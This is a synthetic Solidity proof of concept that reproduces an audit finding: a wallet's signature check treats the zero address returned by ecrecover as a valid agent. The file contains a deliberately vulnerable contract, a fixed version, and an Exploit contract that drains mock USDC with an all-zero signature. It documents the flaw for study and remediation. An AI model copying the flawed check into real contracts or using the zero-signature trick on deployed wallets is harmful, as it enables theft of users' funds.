// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Omo — _validateSignature accepts address(0) (Pashov Audit Group, H-10)
    SYNTHETIC, cheatcode-free. ecrecover of a zero signature returns address(0).
    agents(0) is unset, so the recovered zero matches and the call returns 0.
    1000 USDC then moves. The fix rejects address(0) before that comparison. */

library ECDSA {
    function toEthSignedMessageHash(bytes32 hash) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hash));
    }

    function recover(bytes32 hash, bytes memory signature) internal pure returns (address signer) {
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := mload(add(signature, 0x20))
            s := mload(add(signature, 0x40))
            v := byte(0, mload(add(signature, 0x60)))
        }
        // The audited helper returns ecrecover's address(0) instead of reverting.
        signer = ecrecover(hash, v, r, s);
    }
}

contract Usdc {
    string public constant symbol = "USDC";
    uint8 public constant decimals = 0;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract DynamicAccount {
    uint256 public constant SIG_VALIDATION_FAILED = 1;
    Usdc public token;
    address public lastSigner;

    constructor(address token_) {
        token = Usdc(token_);
    }

    function isAdmin(address) public pure returns (bool) {
        return false;
    }

    function agents(uint256) external pure returns (address) {
        return address(0);
    }

    function _validateSignature(bytes32 userOpHash, bytes memory signature) public returns (uint256 validationData) {
        bytes32 hash = ECDSA.toEthSignedMessageHash(userOpHash);
        address signer = ECDSA.recover(hash, signature);
        lastSigner = signer;

        if (isAdmin(signer)) return 0;

        // @> VULN: address(0) from ecrecover compares equal to the unset agents(0)
        if (this.agents(0) == signer) {
            return 0;
        }
        return SIG_VALIDATION_FAILED;
    }

    function execute(address to, uint256 amount, bytes calldata signature) external {
        bytes32 userOpHash = keccak256(abi.encode(address(this), to, amount));
        uint256 validationData = _validateSignature(userOpHash, signature);
        require(validationData == 0, "sig");
        token.transfer(to, amount);
    }
}

contract DynamicAccountFixed {
    uint256 public constant SIG_VALIDATION_FAILED = 1;
    Usdc public token;

    constructor(address token_) {
        token = Usdc(token_);
    }

    function agents(uint256) external pure returns (address) {
        return address(0);
    }

    function execute(address to, uint256 amount, bytes calldata signature) external {
        bytes32 hash = ECDSA.toEthSignedMessageHash(keccak256(abi.encode(address(this), to, amount)));
        address signer = ECDSA.recover(hash, signature);
        // FIX: a zero recovery is not a signer
        if (signer == address(0)) return;
        if (this.agents(0) != signer) return;
        token.transfer(to, amount);
    }
}

contract Exploit {
    uint256 public constant MOVED = 1000;

    Usdc public token; // CREATE nonce 1
    DynamicAccount public account; // CREATE nonce 2

    uint256 public validationData;
    address public recovered;
    uint256 public moved;

    constructor() {
        token = new Usdc();
        account = new DynamicAccount(address(token));
    }

    function zeroSignature() public pure returns (bytes memory) {
        return abi.encodePacked(bytes32(0), bytes32(0), uint8(27));
    }

    function run() external {
        token.mint(address(account), MOVED);
        bytes memory signature = zeroSignature();
        account.execute(msg.sender, MOVED, signature);
        recovered = account.lastSigner();
        moved = token.balanceOf(msg.sender);
        require(recovered == address(0), "recovery was not zero");
        require(moved == MOVED, "tokens did not move");
        require(token.balanceOf(address(account)) == 0, "account not emptied");
    }
}
